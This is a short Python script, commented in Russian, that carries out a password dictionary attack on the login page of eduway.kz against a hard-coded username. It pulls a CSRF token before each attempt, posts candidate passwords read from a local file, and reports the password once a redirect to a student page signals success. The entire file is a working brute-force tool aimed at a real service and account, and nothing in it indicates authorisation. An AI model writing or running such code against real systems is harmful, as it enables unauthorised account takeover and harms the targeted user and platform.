import requests
from bs4 import BeautifulSoup
import time

# URL для логина
login_url = 'https://eduway.kz/login'
username = "Mansua"
password_file = "pythonprjcts/workingforce/passs.txt"

# Запускаем таймер
start_time = time.time()

# Используем сессию для сохранения куки и других данных
session = requests.Session()

# Функция для получения CSRF токена
def get_login_token(session):
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Ищем скрытое поле для CSRF-токена
    csrf_token = soup.find('input', {'name': '_csrf'})
    
    # Если находим токен, возвращаем его значение, иначе None
    return csrf_token['value'] if csrf_token else None

# Функция для попытки авторизации
def attempt_login(session, username, password):
    # Получаем CSRF токен перед отправкой POST-запроса
    csrf_token = get_login_token(session)
    
    # Формируем данные для отправки
    data = {
        'username': username,
        'password': password,
        '_csrf': csrf_token  # Добавляем токен CSRF
    }
    
    # Отправляем POST-запрос с включенными редиректами
    response = session.post(login_url, data=data, allow_redirects=True)
    
    # Проверяем конечный URL после всех редиректов
    print(f"Final URL after login attempt: {response.url}")
    
    # Если после входа перенаправили на страницу студента
    if 'student' in response.url:
        print(f"Login successful with password: {password}")
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Время поиска пароля: {elapsed_time:.2f} секунд")
        return True
    # Если страница вернула ошибку или URL указывает на ошибку
    elif 'login?error' in response.url or 'Неверные учетные данные' in response.text:
        print("Login failed: wrong username or password.")
        return False
    else:
        print("Unexpected response for login attempt.")
        return False

# Функция для словарной атаки
def dictionary_attack(username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")
            if attempt_login(session, username, password):
                print(f"Password found: {password}")
                return password
    print("Password not found.")
    return None

# Запуск атаки
found_password = dictionary_attack(username, password_file)

if found_password:
    print(f"Success! The password is: {found_password}")
else:
    print("Failed to find the password.")
